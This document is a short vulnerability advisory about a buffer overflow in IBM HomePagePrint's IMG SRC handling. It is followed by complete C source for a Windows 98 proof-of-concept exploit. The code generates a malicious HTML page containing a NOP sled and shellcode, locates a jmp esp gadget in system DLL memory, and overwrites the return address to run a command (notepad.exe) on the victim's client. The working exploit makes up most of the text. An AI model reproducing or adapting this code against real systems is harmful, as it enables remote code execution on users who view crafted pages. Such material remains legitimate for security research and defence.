source: http://www.securityfocus.com/bid/763/info

Certain versions of the IBM Web page printout software "IBM HomePagePrint " can in some instances be remotely exploited by malicious webservers. The problem lies in a buffer overflow in the code which handles IMG_SRC tags. If a page containing a specially constructed IMG SRC tag is previewed or printed using the IBM HomePagePrint software, arbitrary code can be run on the client.

/*=============================================================================
   IBM HomePagePrint Version 1.0.7 Exploit for Windows98
   The Shadow Penguin Security (http://shadowpenguin.backsection.net)
   Written by UNYUN (shadowpenguin@backsection.net)
  =============================================================================
*/

#include	<stdio.h>
#include	<windows.h>

#define		EXPLOIT_HTML	"exploit.html"
#define		HOST_ADDR		"http://www.geocities.co.jp/SiliconValley-SanJose/7479/"
#define		EIP				990
#define		JMPS_CODE		0xe9
#define		JMPS_OFS		0xfffff790

unsigned int mems[]={
0xbfb70000,0xbfbfc000,
0xbfde0000,0xbfde6000,
0xbfdf0000,0xbfdf5000,
0xbfe00000,0xbfe10000,
0xbfe30000,0xbfe43000,
0xbfe80000,0xbfe86000,
0xbfe90000,0xbfe96000,
0xbfea0000,0xbfeb0000,
0xbfee0000,0xbfee5000,
0xbff20000,0xbff47000,
0xbff50000,0xbff61000,
0xbff70000,0xbffc6000,
0xbffc9000,0xbffe3000,
0,0};

unsigned char exploit_code[200]={
0xEB,0x32,0x5B,0x53,0x32,0xE4,0x83,0xC3,
0x0B,0x4B,0x88,0x23,0xB8,0x50,0x77,0xF7,
0xBF,0xFF,0xD0,0x43,0x53,0x50,0x32,0xE4,
0x83,0xC3,0x06,0x88,0x23,0xB8,0x28,0x6E,
0xF7,0xBF,0xFF,0xD0,0x8B,0xF0,0x43,0x53,
0x83,0xC3,0x0B,0x32,0xE4,0x88,0x23,0xFF,
0xD6,0x90,0xEB,0xFD,0xE8,0xC9,0xFF,0xFF,
0xFF,0x00
};
unsigned char cmdbuf[200]="msvcrt.dll.system.notepad.exe";

unsigned int search_mem(FILE *fp,unsigned char *st,unsigned char *ed,
                unsigned char c1,unsigned char c2)
{
    unsigned char   *p;
	unsigned int	adr;

    for (p=st;p<ed;p++)
        if (*p==c1 && *(p+1)==c2){
			adr=(unsigned int)p;
			if ((adr&0xff)==0) continue;
			if (((adr>>8)&0xff)==0) continue;
			if (((adr>>16)&0xff)==0) continue;
			if (((adr>>24)&0xff)==0) continue;
			return(adr);
		}
	return(0);
}

int PASCAL WinMain(HINSTANCE hInst, HINSTANCE hInstPrev, LPSTR pszCmdLine, int CmdShow)
{
	FILE					*fp;
	unsigned int			i,ip,eip;
	static unsigned char	buf[30000];

	if ((fp=fopen(EXPLOIT_HTML,"wb"))==NULL) return FALSE;
	fprintf(fp,"<HTML><IMG SRC=\"");

	memset(buf,'a',2000); buf[2000]=0;
	for (i=0;i<50;i++) buf[i]=0x90;
	strcat(exploit_code,cmdbuf);
	memcpy(buf+50,exploit_code,strlen(exploit_code));

    for (i=0;;i+=2){
		if (mems[i]==0) return FALSE;
		if ((ip=search_mem(fp,(unsigned char *)mems[i],
			(unsigned char *)mems[i+1],0xff,0xe4))!=0) break;
    }

	eip=EIP-strlen(HOST_ADDR);
	buf[eip  ]=ip&0xff;
	buf[eip+1]=(ip>>8)&0xff;
	buf[eip+2]=(ip>>16)&0xff;
	buf[eip+3]=(ip>>24)&0xff;

	ip=JMPS_OFS;
	buf[eip+4]=JMPS_CODE;
	buf[eip+5]=ip&0xff;
	buf[eip+6]=(ip>>8)&0xff;
	buf[eip+7]=(ip>>16)&0xff;
	buf[eip+8]=(ip>>24)&0xff;

	fwrite(buf,2000,1,fp);

	fprintf(fp,"\"></HTML>");
	fclose(fp);
	return FALSE;
}

